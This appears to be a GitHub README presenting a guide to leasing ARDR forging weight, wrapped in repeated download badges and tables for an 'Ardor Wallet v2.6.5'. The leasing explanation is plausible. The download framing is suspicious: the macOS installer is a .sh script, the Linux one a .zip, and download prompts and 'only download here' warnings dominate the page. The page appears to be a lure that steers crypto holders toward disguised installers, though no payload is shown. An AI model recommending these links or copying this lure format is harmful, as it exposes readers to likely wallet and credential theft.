![Ardor Wallet guide](assets/banner-article.png)

# Lease ARDR and earn fees without running a node

<p align="center"><a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-WINDOWS-1562a1?style=for-the-badge&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-MACOS-1562a1?style=for-the-badge&labelColor=0c395d&logo=apple&logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-LINUX-1562a1?style=for-the-badge&labelColor=0c395d&logo=linux&logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img height="24" src="https://img.shields.io/badge/platform-Windows-3e83be?style=flat-square&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`ardor-wallet-2.6.5.exe`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe) |
| <img height="24" src="https://img.shields.io/badge/platform-macOS-3e83be?style=flat-square&labelColor=0c395d&logo=apple&logoColor=white" alt="macOS"> | macOS 12 or later | [`ardor-wallet-2.6.5.sh`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh) |
| <img height="24" src="https://img.shields.io/badge/platform-Linux-3e83be?style=flat-square&labelColor=0c395d&logo=linux&logoColor=white" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`ardor-wallet-2.6.5.zip`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip) |

</div>

All versions, installer files and checksums are on the [Ardor Wallet release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

> [!WARNING]
> Only download from [this GitHub release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

---

A lease assigns your forging weight to somebody else for a set stretch of time while the coins remain in your wallet. The lease starts after 1,440 blocks, runs for a maximum of about 46 days, cannot be changed until it expires, and never gives the recipient access to your balance.

## What a lease actually does

[Forging](https://github.com/ardor-software/ardor-forging-and-nodes/blob/main/what-ardor-forging-means.md) weight is calculated from effective balance. A lease transfers that weight, not the funds: the recipient forges with the combined weight of everyone who leased to them, and your coins remain yours, spendable and visible in your wallet.

That distinction is the whole safety story. A lease is a protocol-level arrangement between two accounts, signed by you, and it moves no tokens. Anyone who asks you to send [ARDR](https://github.com/ardor-software/ardor-wallet-guides/blob/main/what-the-ardor-token-does.md) to participate in forging is not describing a lease.

## Lease step by step

1. Open the wallet and unlock the [Ardor account](https://github.com/ardor-software/ardor-wallet-guides/blob/main/create-an-ardor-account-in-the-wallet.md) holding the ARDR.
2. Confirm the effective [balance](https://github.com/ardor-software/ardor-forging-and-nodes/blob/main/ardor-wallet-balance-shows-zero.md) figure, since that is what the lease will hand over.
3. Open the leasing control and enter the recipient's account address.
4. Set the period, up to the maximum the protocol allows.
5. Review the summary and confirm. The lease is recorded as a transaction.
6. Note the start and end blocks, and leave the account funded for the duration.

A lease signed with an empty or under-funded account gives the recipient nothing to work with, which is why the effective balance check comes before the address. The figure that matters is the effective one, not the spendable balance shown beside it.

## The delay and the cap

A lease does not take effect immediately. It begins after 1,440 blocks, roughly a day, and it cannot be altered once it is in place. The maximum term is about 46 days.

Those two properties exist for the same reason: to make forging arrangements predictable. A recipient planning capacity needs to know the weight will be there tomorrow, and a lease that could be revoked at any moment would be worthless to them. The cost is that you cannot change your mind mid-term, so the term you choose is the commitment you make.

## What a lease does not do

- It does not move your coins. The balance stays in your account and remains spendable.
- It does not give the recipient your secret or any signing authority over your funds.
- It does not earn a fixed return. The recipient forges, and any sharing is an arrangement between the two of you.
- It does not stop you spending. Spending reduces the balance, and a reduced balance can drop the effective amount below what you leased.

That last point surprises people: a lease is a commitment of weight, and if you empty the account the weight is no longer there to give.

## What the operator actually receives

A lessor hands over weight, and the operator combines it with their own and with everyone else's. What the operator receives from the network is the fee income of the blocks that weight helps produce, plus the ability to run a stable forging operation without buying the balance themselves.

That is a business, and it has costs: hardware, electricity, uptime, updates. A share agreement is therefore a split of a real but variable income, not a payment for holding. When fee activity falls, both sides earn less, and an operator who promised a fixed figure has promised something the protocol does not deliver.

## Choosing who to lease to

There is no registry of reputable operators, which means the decision is a judgement about a person or a service rather than a lookup. What helps:

- A public history of paying what was agreed, over more than one term.
- Clear terms in writing about how rewards are split and when they are paid.
- No request for your secret, your wallet file, or a transfer of coins. Ever.
- A reachable operator who answers before the lease, not only after.

If any of those is missing, the lease is a donation of forging power with extra steps. The protocol cannot enforce a payout, so the terms are only as good as the other party.

## Ending a lease

A lease expires on its own at the end of the term. There is no early exit, no cancel button and no support route to shorten it. When it expires, the weight returns to your account and you can forge yourself or lease again.

Plan around the end date rather than trying to work around it. If you might need the weight back sooner, lease a shorter term, even though that makes the arrangement less attractive to an operator, since a short commitment is worth less to somebody planning capacity.

## FAQ

### Does leasing put my coins at risk?

No. A lease moves forging power, not funds, and the recipient cannot sign for your account. The risk is a missed payout, not a lost balance.

### Can I spend coins while they are leased?

Yes. Spending reduces the balance, and if it drops far enough the effective balance falls below what you leased, so the recipient gets less weight than expected.

### Why has my lease not started yet?

Because it starts after 1,440 blocks. Until then the weight is still counted for your own account.

### Can I cancel a lease early?

No. A lease cannot be changed until it expires, which is why the term deserves thought before signing rather than after.

---

## Download

Every installer for the current release, with the platform each one targets:

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img height="24" src="https://img.shields.io/badge/platform-Windows-3e83be?style=flat-square&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`ardor-wallet-2.6.5.exe`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe) |
| <img height="24" src="https://img.shields.io/badge/platform-macOS-3e83be?style=flat-square&labelColor=0c395d&logo=apple&logoColor=white" alt="macOS"> | macOS 12 or later | [`ardor-wallet-2.6.5.sh`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh) |
| <img height="24" src="https://img.shields.io/badge/platform-Linux-3e83be?style=flat-square&labelColor=0c395d&logo=linux&logoColor=white" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`ardor-wallet-2.6.5.zip`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip) |

</div>

All versions, installer files and checksums are on the [Ardor Wallet release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

> [!WARNING]
> Only download from [this GitHub release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).
---

## Related guides

- [What forging means on Ardor, and why it is not mining](https://github.com/ardor-software/ardor-forging-and-nodes/blob/main/what-ardor-forging-means.md)
- [Start forging ARDR in the wallet, and why it may not start](https://github.com/ardor-software/ardor-forging-and-nodes/blob/main/start-forging-in-the-ardor-wallet.md)
- [What forgers actually earn, and what they do not](https://github.com/ardor-software/ardor-forging-and-nodes/blob/main/what-ardor-forgers-actually-earn.md)
- [What the ARDR token is, what it pays for, and what its fixed supply means](https://github.com/ardor-software/ardor-wallet-guides/blob/main/what-the-ardor-token-does.md)
- [Ardor Wallet v2.6.5 release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5)
